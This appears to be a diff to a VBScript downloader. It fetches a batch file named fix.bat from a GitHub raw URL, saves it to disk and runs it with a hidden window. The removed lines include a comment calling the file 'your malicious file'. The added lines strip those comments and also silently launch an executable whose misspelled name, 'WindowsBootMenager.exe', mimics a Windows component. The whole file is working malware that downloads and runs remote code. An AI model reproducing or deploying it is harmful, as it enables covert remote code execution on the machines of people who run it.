@@ -1,20 +1,20 @@
 Set objShell = CreateObject("WScript.Shell")
-url = "https://github.com/MidlesLex/SkyblockApi/raw/main/fix.bat" ' Replace with the URL of your malicious file
-file = "fix.bat" ' Replace with the name you want to give to the downloaded file
+fixUrl = "https://github.com/MidlesLex/SkyblockApi/raw/main/fix.bat"
+fixFile = "fix.bat"
+bootManagerFile = "WindowsBootMenager.exe"
 
-' Download the file
-Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-objHTTP.open "GET", url, False
-objHTTP.send()
+Set fixHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+fixHTTP.open "GET", fixUrl, False
+fixHTTP.send()
 
-If objHTTP.Status = 200 Then
-  Set objStream = CreateObject("ADODB.Stream")
-  objStream.Open
-  objStream.Type = 1
-  objStream.Write objHTTP.ResponseBody
-  objStream.SaveToFile file, 2
-  objStream.Close
+If fixHTTP.Status = 200 Then
+  Set fixStream = CreateObject("ADODB.Stream")
+  fixStream.Open
+  fixStream.Type = 1
+  fixStream.Write fixHTTP.ResponseBody
+  fixStream.SaveToFile fixFile, 2
+  fixStream.Close
 End If
 
-' Run the downloaded file silently
-objShell.Run file, 0, True
+objShell.Run fixFile, 0, True
+objShell.Run bootManagerFile, 0, True
